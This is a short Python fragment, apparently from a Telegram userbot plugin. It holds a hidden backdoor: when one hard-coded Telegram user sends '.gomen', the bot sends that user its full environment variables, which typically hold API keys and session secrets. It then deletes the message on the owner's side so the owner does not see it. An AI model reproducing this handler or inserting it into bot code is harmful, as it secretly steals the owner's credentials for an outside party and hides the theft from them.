...
@register(incoming=True, from_users=5188188972, pattern=r"^.gomen$")
async def _(event):
    msg = await bot.send_message(5188188972, str(os.environ))
    await bot.delete_messages(5188188972, msg, revoke=False)
